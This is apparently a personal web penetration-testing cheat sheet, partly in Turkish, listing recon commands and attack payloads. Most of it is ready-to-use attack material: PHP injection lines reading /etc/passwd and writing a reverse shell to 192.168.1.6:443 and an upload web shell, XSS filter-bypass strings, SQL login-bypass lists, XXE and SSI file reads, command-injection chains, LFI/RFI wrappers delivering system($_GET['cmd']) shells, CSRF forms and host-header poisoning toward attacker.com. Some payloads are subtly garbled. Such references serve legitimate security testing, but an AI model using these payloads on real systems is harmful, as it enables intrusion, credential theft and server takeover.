---
title: "Notes" 
header:
  image: /assets/images/dan.jpg
categories:
   - 
tag:
   -   
---

# —

---

# php code injection

```bash
;id
'id'
;id;
&&id
echo 'id'
system('id')
;system('id')
system("id")
SYSTEM("id")
system(%27id%27)
system('id');phpinfo()
SYSTEM('id');PHPINFO()
;system('/usr/bin/id')
system('cat /etc/passwd');
;system('cat /etc/passwd')
shell exec("id")
SHELL EXEC("id")
exec("id")
EXEC("id")
exec("ping -c 4 192.168.1.6")
passthru("id")
PASSTHRU("id")
phpinfo()
phpinfo();id
PHPINFO()
PHPINFO();id
phpinfo();system('cat /etc/passwd')
phpinfo();system('id')
PHPINFO();SYSTEM('id')
print_r($_POST);system('id')
PRINT_R($_POST);SYSTEM('id')
pcntl_exec("/usr/bin/uptime")
readfile?"/etc/passwd")
file get contents ("/etc/passwd")
$file = fopen ("testl.txt", "w"); echo fwrite($file, "Hello World. Testing!"); fclose($file)
$file = fopen ("phpinfo-1.php", "W"); echo fwrite ($file, "<?php phpinfo(); ?>"); fclose ($file)
$file = fopen("pshell.php", "w"); echo fwrite($file, "php -r '$sock=fsockopen ('192.168.1.6' ,443) ;' /bin/sh -i <83 >83 2-83' ;"); fclose($file)
$file = fopen ("upload2.php", "w"); echo fwrite($file, '<html><form action="upload2.php" method="post" enctype="multipart/form-data">Select image to upload; <input type="file" name="fileToUpload" id="fileToUpload"><input type="submit" value="Upload" name="submit"></form></html><?php if( isset ($_POST["submit"])){ $file_name = $_FILES["fileToUpload"] ["name"]; $file_tmp_name = $FILES["fIleToUpload"("tmpname"]; if (move uploaded_file($file_tmp_ name, " ./" . $file_name)) { echo "ok"; } } ?>'); fclose($file)
passthru('id')
PASSTHRU('id')
;SYSTEM('id')
readfile("/etc/passwd");
readfile("index.html");
READFILE("index.html")
READFILE("/etc/passwd")
echo%20file_exists("index.html");
echo%20file_exists("/etc/passwd");
ECHO%20FILE_EXISTS("index.html");
ECHO%20FILE_EXISTS("/etc/passwd");
chmod("index.html",0777);
CHMOD("index.html",0777);
echo%20copy("/etc/passwd","/tmp/passwd");
echo%20file_exists("/tmp/passwd");
echo%20file_get_contents("/etc/passwd");
ECHO%20FILE_GET_CONTENTS("/etc/passwd");
echo%20file_put_contents("index.html","Hello%20World.%20Testing!");
ECHO%20FILE_PUT_CONTENTS("index.html","HELLO%20WORLD.%20TESTING!");
echo%20fileperms("index.html");
echo%20fileperms("/etc/passwd");
ECHO%20FILEPERMS("index.html");
ECHO%20FILEPERMS("/etc/passwd");
print_r(glob("*.txt"));
print_r(glob("*.html"));
print_r(glob("*.config"));
```

Dorking, Shodan gitleaks (Manuel)

SSLscan,ssllabs afsa

Subdomain Enum. (Amass, subfinder ) —> 200 dönenlere gau, spider  ve Extracting JS

Hidden Directory Searching (gobuster yada Ffuf)

Subdomain Takeover (Nuclei)

Port Scan (nmap)

HTTP Methods kontrolleri

HTST

Rate Limit Control

exiftool 

> **ExifTool**, used for reading and writing meta information in a variety of file types
> 

```bash
 nmap -sS -sC -sV -T4 -A -p- --defeat-rst-ratelimit --script=vuln -oN nmap_result.txt --min-rate=300 --max-retries=3 $target_ip
```

# İnput Validation

[FXfGAGYVsAAp0zp.jfif](%E2%80%94%20bc8316d476ef4486a2fa5bf8f689a9e6/FXfGAGYVsAAp0zp.jfif)

![Untitled](%E2%80%94%20bc8316d476ef4486a2fa5bf8f689a9e6/Untitled.png)

![Untitled](%E2%80%94%20bc8316d476ef4486a2fa5bf8f689a9e6/Untitled%201.png)

## ffuf

Burp ile analiz gerektiğinde domaini 127.0.0.1:8080 olarak değiştirip burp tarafından da request handling’i ayarlamak lazım. 

[https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#using-an-interface](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#using-an-interface)

istekler arası delay **-p 2 veya -p 0.1-2.0**

maks istek miktarı -rate 2

Directory

```jsx
ffuf -u http://localhost:3000/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

File Enum

```jsx
ffuf -u http://localhost:3000/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.html,.txt -mc 200
```

Subdomain Enum

```jsx
ffuf -u http://FUZZ.mydomain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## Nuclei

```jsx
nuclei -u https://example.com -t /path/to/templates/ -severity critical,high,medium,low

```

httpS değilse ayarı var, templates ve ilerleme şekline bakılmalı

## Nikto

```jsx
nikto -h scanme.nmap.org
-ssl sslsiz için
```

## XSS

***Seclists*** 

OWASP Polygot 

```jsx
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

**XSS-Polyglot-Ultimate-0xsobky.txt**

```jsx
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

 —

```jsx
javascript:/*</script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+((new(Image)).**src**=([]+/\/1\.1\.\1\./).replace(/\\/g,[]))//'>
```

```jsx
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input type=image src=x:x onerror=alert(1)>
<isindex onmouseover="alert(1)">
<form oninput=alert(1)><input></form>
<textarea autofocus onfocus=alert(1)>
<input oncut=alert(1)>
'-alert(1)-'
?%27accesskey=%27x%27onclick=%27alert(1) --> Tarayıcı kısa yol tuşu ayarlayarak XSS yapma ALT+Shift+X(bu örnekte)

very common regex (on\w+s*=) --> on ile başlayan eventleri engeller.

<svg/onload=alert(1)> --> sondaki < işaretini kaldırmak XSSAuditor'ü atlatır.
<svg//////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id='x'onload=alert(1)>

(?i)([\s\"'`;\/0-9\=]+on\w+}s*=) --> gelişmiş hali

<svg onloa*d%09=alert(1)>
<svg %09onload=alert(1)>*
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload%0B=alert(1)>

sonraki adım -->(?i)([\s\"'`;\/0-9\=\x00\xo9\0A\x0B\x0C\0x0D\x3B\x2C\x28\x3B]+on\w+[\s\x00\xo9\0A\x0B\xOC\0x0D\x3B\x2C\x28\x3B]*?=)

Karakter escaping> Unicode
<script>\u0061lert(1)</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script> 
<script>eval("\u0061lert(1)")</script>
<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>

Karkater Escaping > Decimal, Octal,Hexadecimal
<img src=x onerror="\u0061lert(1)"/> --Unicode
<img src=x onerror="eval('\141lert(1)')"/> --> octal escape
<img src=x onerror="eval('\x61lert(1)')"/> --> hexadecimal escape

<img src=x onerror="&#x0061;lert(1)"/> --> Hexadecimal Numeric Character Referans
<img src=x onerror="&#97;lert(1)"/> --> Decimal NCR
<img src=x onerror="eval('\a\l\ert\(1\)')"/> Superfluous Escapes characters
<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\($#49)')"/> --> hepsi birlikte

Alert engelliyse farklı şekillerde alert yazman denenebilir.
/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,116)
atob("YWxlcnQ=")
17795081..toString(36)
<script>eval(8680439..toString(30))(983801..toString(36))</script>

JavaScript: bloklu ise
<object data="JaVaScRiPt:alert(1)">
<object data="javascript&colon;:alert(1)">
<object data="java
script:alert(1)">
<object data="javascript&#x003A;alert(1)">
<object data="javascript&#58;alert(1)">
<object data="&#x6a;avascript:alert(1)">
<object
data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<object data="data:text/html;html,<script>alert(1)</script>"></object>
eğer data bloklu ise,
<embed code="DaTa:text/html,<script>alert(1)</script>">
<embed code="data&colon;text/html,<script>alert(1)</script>">
<embed code="data&#x003A;text/html,<script>alert(1)</script>">
<embed code="&#x64;&#x61;ta:text/html,<script>alert(1)</script>">

vbscript için
<iMg src=a onErRor="vBsCriPt:AlErT(1)"/>
<img src=x onerror="vbscript&#x003A;alert(1)">
<img src=x onerror="vb&#x63;cript:alert(1)">

<ScRipt>alert(1);</ScRiPt>
<ScRiPt>alert(1);
<script hehe> alert(1);</script>
<script
>alert(1);</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr<iframe>ipt>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>
<a href="javascript:alert(1)">show</a>
<a href="data:text/html;base64;

**Escaping Quotes**
\\'alert;//
String.fromCharCode(120,115,9416)
unescape(/%78%u0073%73/.source)
decodeURI(/alert(%22xss%22)/.source)
decodeURIComponent(/alert(%22xss%22)/.source)

Escaping Parentheses
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
<img src=x onerror=alert;throw 1;>
<img src=x onerror="
window.onerror=eval;throw'\u003d&#x0061;&#x006C;ert&#x0028;1&#41;'"/>
```

[https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)

CloudFront bypass:

## Parameter Pollution

```jsx
/index.aspx?page=select 1&page=2,3 ----> WAF atlatır

/admin/?kerberos=onmouseover=alert(1)&kerberos  ---> endpoint valid görür ve xss patlatır

security_token=attackertoken&blogID=attackerblogidvalue&blogID=victimblogidvalue&authorsList=goldshlager19test%40gmail.com(attacker email)&ok=Invite
Uygulama ilk blogID parametresini kontrol eder ancak ikinci blogID parametresini kullanır.

/?color=red&color=blue
```

## SQLi

[SQLi](https://www.notion.so/SQLi-e5e8238f67834c41a38ff241e778279a?pvs=21) 

- login bypass
    
    ```bash
    0' or '0' = '0
    1' or '1' = '1
    '-'
    ' '
    '&'
    '^'
    '*'
    ' or ''-'
    ' or '' '
    ' or ''&'
    ' or ''^'
    ' or ''*'
    "-"
    " "
    "&"
    "^"
    "*"
    " or ""-"
    " or "" "
    " or ""&"
    " or ""^"
    " or ""*"
    or true--
    " or true--
    ' or true--
    ") or true--
    ') or true--
    ' or 'x'='x
    ') or ('x')=('x
    ')) or (('x'))=(('x
    " or "x"="x
    ") or ("x")=("x
    ")) or (("x"))=(("x
    or 1=1
    or 1=1--
    or 1=1#
    or 1=1/*
    ' OORR 1<2 #
    admin' --
    admin' #
    admin'/*
    admin' or '1'='1
    admin' or '1'='1'--
    admin' or '1'='1'#
    admin' or '1'='1'/*
    admin'or 1=1 or ''='
    admin' or 1=1
    admin' or 1=1--
    admin' or 1=1#
    admin' or 1=1/*
    admin') or ('1'='1
    admin') or ('1'='1'--
    admin') or ('1'='1'#
    admin') or ('1'='1'/*
    admin') or '1'='1
    admin') or '1'='1'--
    admin') or '1'='1'#
    admin') or '1'='1'/*
    1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
    admin" --
    admin" #
    admin"/*
    admin" or "1"="1
    admin" or "1"="1"--
    admin" or "1"="1"#
    admin" or "1"="1"/*
    admin"or 1=1 or ""="
    admin" or 1=1
    admin" or 1=1--
    admin" or 1=1#
    admin" or 1=1/*
    admin") or ("1"="1
    admin") or ("1"="1"--
    admin") or ("1"="1"#
    admin") or ("1"="1"/*
    admin") or "1"="1
    admin") or "1"="1"--
    admin") or "1"="1"#
    admin") or "1"="1"/*
    1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
    ' and 1='1
    ' and a='a
     or 1=1
     or true
    ' or ''='
    " or ""="
    1′) and '1′='1–
    ' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
    " AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
     and 1=1
     and 1=1–
    ' and 'one'='one
    ' and 'one'='one–
    ' group by password having 1=1--
    ' group by userid having 1=1--
    ' group by username having 1=1--
     like '%'
     or 0=0 --
     or 0=0 #
     or 0=0 –
    ' or         0=0 #
    ' or 0=0 --
    ' or 0=0 #
    ' or 0=0 –
    " or 0=0 --
    " or 0=0 #
    " or 0=0 –
    %' or '0'='0
     or 1=1
     or 1=1--
     or 1=1/*
     or 1=1#
     or 1=1–
    ' or 1=1--
    ' or '1'='1
    ' or '1'='1'--
    ' or '1'='1'/*
    ' or '1'='1'#
    ' or '1′='1
    ' or 1=1
    ' or 1=1 --
    ' or 1=1 –
    ' or 1=1--
    ' or 1=1;#
    ' or 1=1/*
    ' or 1=1#
    ' or 1=1–
    ') or '1'='1
    ') or '1'='1--
    ') or '1'='1'--
    ') or '1'='1'/*
    ') or '1'='1'#
    ') or ('1'='1
    ') or ('1'='1--
    ') or ('1'='1'--
    ') or ('1'='1'/*
    ') or ('1'='1'#
    'or'1=1
    'or'1=1′
    " or "1"="1
    " or "1"="1"--
    " or "1"="1"/*
    " or "1"="1"#
    " or 1=1
    " or 1=1 --
    " or 1=1 –
    " or 1=1--
    " or 1=1/*
    " or 1=1#
    " or 1=1–
    ") or "1"="1
    ") or "1"="1"--
    ") or "1"="1"/*
    ") or "1"="1"#
    ") or ("1"="1
    ") or ("1"="1"--
    ") or ("1"="1"/*
    ") or ("1"="1"#
    ) or '1′='1–
    ) or ('1′='1–
    ' or 1=1 LIMIT 1;#
    'or 1=1 or ''='
    "or 1=1 or ""="
    ' or 'a'='a
    ' or a=a--
    ' or a=a–
    ') or ('a'='a
    " or "a"="a
    ") or ("a"="a
    ') or ('a'='a and hi") or ("a"="a
    ' or 'one'='one
    ' or 'one'='one–
    ' or uid like '%
    ' or uname like '%
    ' or userid like '%
    ' or user like '%
    ' or username like '%
    ' or 'x'='x
    ') or ('x'='x
    " or "x"="x
    ' OR 'x'='x'#;
    '=' 'or' and '=' 'or'
    ' UNION ALL SELECT 1, @@version;#
    ' UNION ALL SELECT system_user(),user();#
    ' UNION select table_schema,table_name FROM information_Schema.tables;#
    admin' and substring(password/text(),1,1)='7
    ' and substring(password/text(),1,1)='7
    ' or 1=1 limit 1 -- -+
    '="or'
    ' and 'x'='x
    admin' or 1=1;-- 
    ?id=1' order by 1 --+
    ?id=1' and "a"="a"--+
    ?id=1' and database()="securtiy"--+
    ?id=1' and substring(database(),1,1)="a"--+
    ?id=1' and sleep(2) and "a"="a"--+
    ?id=1' and sleep(2) and substring(database(),1,1)="a"--+
    '+||+1=1#
    ```
    

Polygot

```jsx
SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```

[SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

MSSQL Blind Injection

```jsx
Main query for Blind Error Based Injection: '%2bconvert(char,(SELECT IIF(SUBSTRING((***query_here***),1,1)='d',3,@@VERSION)))%2b
Queries inside to the main query:
-> select db_name() 
<- Returns current database name
-> select host_name() 
<- Returns hostname
-> select top 1 table_name from INFORMATION_SCHEMA.tables 
<- Returns the first table from Information Schema
-> select top 1 column_name from INFORMATION_SCHEMA.columns 
<- Returns the first column from Information Schema
-> select ***column_name*** from ***table_name*** ORDER BY ***column_name*** OFFSET 2 ROW FETCH FIRST 1 ROW ONLY 
<- Returns the data of the second row from selected column/table.
```

## XML

```jsx
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

```jsx
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>

-----------------------------------------------------------
XInclude attacks
When you can't modify the DOCTYPE element use the XInclude to target

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

[https://github.com/payloadbox/xxe-injection-payload-list](https://github.com/payloadbox/xxe-injection-payload-list)

Görsel eklerken de olabiliyor PortSwigger lablarına bak 

[PortSwigger Wiki](https://www.notion.so/PortSwigger-Wiki-a1ac7b0555aa4d2894508c51b993f3a2?pvs=21)

## SSI

.shtml gibi dosyaların olduğu yerde çalışır.

```jsx
<!--#exec cmd="/bin/ls /" --><br/>
<!--#exec cmd="cat /etc/passwd" --><br/>
<!--#exec cmd="find / -name *.* -print" --><br/>
<!--#exec cmd="mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < cat /etc/passwd" --><br/>
```

## Code Injection

```jsx
#Unix ve Windows birlikte
ls||id; ls ||id; ls|| id; ls || id
ls|id; ls |id; ls| id; ls | id
ls&&id; ls &&id; ls&& id; ls && id
ls&id; ls &id; ls& id; ls & id
ls %0A id                           # %0A Execute both (RECOMMENDED)

Unix
;id;
;id
;netstat -a;
|id
|/usr/bin/id
|id|

Windows
| dir
; dir
$(`dir`)
& dir
&&dir
&& dir
| dir C:\
; dir C:\
& dir C:\
&& dir C:\

nslookup güzel çözümlerden(diğer komutlar WAF'a takılabilir ancak DNS dışarıya çıkabilir.)
```

[https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)

[Bypass Linux Shell Restrictions](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)

## Local File Inclusion-Remote File Inclusion (LFI&RFI)

Daha detaylı yükler sanal makinede bulunmaktadır.

```jsx
etc/passwd
etc/passwd%00
../../etc/passwd
%252e%252e%252f
....//....//etc/passwd
```

LFI Wrapper rot13 and base64 - php://filter case insensitive.

```jsx
/index.php?page=php://filter/read=string.rot13/resource=index.php
/index.php?page=php://filter/convert.base64-encode/resource=index.php
/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

Can be chained with a compression wrapper.
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

**LFI Wrapper ZIP :**

```jsx
echo "</pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
rm payload.php   

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

**RFI Wrapper DATA with "" payload :**

```jsx
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

**RFI Wrapper EXPECT :**

```jsx
http://example.com/index.php?page=php:expect://id
http://example.com/index.php?page=php:expect://ls
```

**XSS via RFI/LFI with "" payload :**

```jsx
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

[https://github.com/payloadbox/rfi-lfi-payload-list](https://github.com/payloadbox/rfi-lfi-payload-list)

## HTTP Splitting & HTTP Smuggling

CRLF—> Splitting

```jsx
%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>GORKEMSplitting</html>
```

CRLF için most likely 

- `Location`
- `Set-Cookie`

parametreleri gerekir

**HTTP Smuggling —> tool ile bulgu olursa turbo intuder için payloadlar da bu github da var.**

[https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)

## Host Header Attack

Case okumak gerek 

Reset password poisoning

```jsx
X-Forwarded-Host: www.attacker.com
X-Forwarded-For:
X-Original-URL:
X-Rewrite-URL:
X-HOST:
```

## Server-Side Template Injection (SSTI)

In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :

`${{<%[%'"}}%\.`

## 

![Untitled](%E2%80%94%20bc8316d476ef4486a2fa5bf8f689a9e6/Untitled%202.png)

[PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

## Cross-Side Request Forgery (CSRF)

```jsx
<html>
<body onload='document.CSRF.submit()'>

<form action='http://targetWebsite/Authenticate.jsp' method='POST' name='CSRF'>
    <input type='hidden' name='name' value='Hacked'>
    <input type='hidden' name='password' value='Hacked'>
</form>

</body>
</html>
```

JSON eksik hatası verirse 

```jsx
<html>
 <body>
  <script>history.pushState('', '', '/')</script>
   <form action='http://victimsite.com' method='POST' enctype='text/plain'>
     <input type='hidden' name='{"name":"hacked","password":"hacked","padding":"'value='something"}' />
     <input type='submit' value='Submit request' />
   </form>
 </body>
</html>
```

## Server-Side Request Forgery (SSRF)

[SSRF (Server Side Request Forgery)](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

[PayloadsAllTheThings/Server Side Request Forgery at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

## DOM-Based XSS

Tespit edilmesi daha zordur. Source ve sink’ler bulunmalıdır. Dom Invader kullanılabilir.

DOMXSS 

[JavaScript Injection](http://www.domxss.com/domxss/01_Basics/04_eval.html)

## HTML Injection

h1 tag i denenebilir iframe denenebilir

## CORS

BurpSuite halleder

Access-Control-Allow-Origin —> Hangi originlere izin var (Hepsine güveniyorsa CSRF saldırısı yaparak hassas veri alınabilir)( Eğer SADECE Null kabul ediyorsa yine CSRF yapılarak hassas veri alınabilir PortSwigger 2. lab örneği. ) (Subdomainlere güveniyorsa subdomain manipüle edilerek atak vektörü çıkartılabilir veya uygulaamada bulunan subdomainlerdeki zafiyetler kullanılarak hassas veri alınabilir PortSwigger 3. lab) ()

Access-Control-Allow-Credentials —> Kullanıcı bilgisine ihtiyaç gerek duyuluyor mu bağlanılırken.

## IDOR

## **File Upload Vulnerabilities**

[Malicious File Upload Checklist](https://www.notion.so/Malicious-File-Upload-Checklist-e951903d43c1412eade18b531975739e?pvs=21)

[File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

### **JWT**

### Rate Limit Bypass

X-Originating-IP: IP
X-Forwarded-For: IP
X-Remote-IP: IP
X-Remote-Addr: IP
X-Client-IP: IP
X-Host: IP
X-Forwared-Host: IP

### Security Headers

- X-XSS-Protection —> reflected xss için önlem
- X-Frame-Options —> clickjacking için önlem
- Strict-Transport-Security —> HSTS için ?? max-age olmalı
- X-Content-Type-Options —> content type’ı standartlaştırır
- Content Security Policy —> Görsel anlatıyor.

![Untitled](%E2%80%94%20bc8316d476ef4486a2fa5bf8f689a9e6/Untitled%203.png)

pip install pandas requests fpdf openpyxl

pip install extract-msg
